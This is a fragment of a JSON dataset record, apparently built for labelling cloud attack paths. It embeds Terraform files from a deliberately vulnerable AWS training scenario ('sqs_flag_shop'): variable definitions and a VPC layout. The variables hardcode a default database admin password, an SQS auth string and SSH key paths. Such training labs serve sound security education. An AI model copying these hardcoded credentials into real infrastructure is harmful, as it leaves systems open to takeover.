+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use.\"\n  type        = string\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy resources to.\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming.\"\n  type        = string\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es)\"\n  type        = list(string)\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the stack.\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario.\"\n  default     = \"sqs_flag_shop\"\n  type        = string\n}\n\nvariable \"ssh_public_key\" {\n  description = \"SSH Public Key\"\n  default     = \"../cloudgoat.pub\"\n  type        = string\n}\n\nvariable \"ssh_private_key\" {\n  description = \"SSH Private Key\"\n  default     = \"../cloudgoat\"\n  type        = string\n}\n\nvariable \"database_name\" {\n  description = \"db_name\"\n  default     = \"cash\"\n  type        = string\n}\n\nvariable \"database_username\" {\n  description = \"rds_db_username\"\n  default     = \"admin\"\n  type        = string\n}\n\nvariable \"database_password\" {\n  description = \"rds_db_passwrod\"\n  default     = \"bob12cgv\"\n  type        = string\n}\n\nvariable \"sqs_auth\" {\n  description = \"sqs_auth\"\n  default     = \"sqs_flag_shop_charging_request_auth\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/vpc.tf",
+      "member_sha256": "19a874fe9e8a3f38f328da58ec1a8e7bef332796c9b3f134afcfd52fffa90f0c",
+      "bytes": 1874,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"vpc\" {\n  cidr_block           = \"10.10.0.0/16\"\n  enable_dns_hostnames = true\n\n  tags = {\n    Name = \"cg-${var.cgid}\"\n  }\n}\n\n\nresource \"aws_internet_gateway\" \"this\" {\n  vpc_id = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"cg-${var.cgid}\"\n  }\n}\n\n\n# Public Subnets\nresource \"aws_subnet\" \"public_1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.10.10.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"cg-${var.cgid}-public-1\"\n  }\n}\n\nresource \"aws_subnet\" \"public_2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block        = \"10.10.20.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"cg-${var.cgid}-public-2\"\n  }\n}\n\n# Private Subnets\nresource \"aws_subnet\" \"private_1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.10.30.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"cg-${var.cgid}-private-1\"\n  }\n}\n\nresource \"aws_subnet\" \"private_2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block        = \"10.10.40.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"cg-${var.cgid}-private-2\"\n  }\n}\n\n\nresource \"aws_route_table\" \"public\" {\n  vpc_id = aws_vpc.vpc.id\n\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.this.id\n  }\n\n  tags = {\n    Name = \"cg-${var.cgid}-public\"\n  }\n}\n\nresource \"aws_route_table\" \"private\" {\n  vpc_id = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"cg-${var.cgid}-private\"\n  }\n}\n\n\nresource \"aws_route_table_association\" \"public_1\" {\n  for_each = {\n    1 = aws_subnet.public_1.id\n    2 = aws_subnet.public_2.id\n  }\n\n  subnet_id      = each.value\n  route_table_id = aws_route_table.public.id\n}\n\nresource \"aws_route_table_association\" \"private\" {\n  for_each = {\n    1 = aws_subnet.private_1.id\n    2 = aws_subnet.private_2.id\n  }\n\n  subnet_id      = each.value\n  route_table_id = aws_route_table.private.id\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "1b42ab89ef267d8f750e1570883f131db3153dd8c2c411335b43aea7aca974f7",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
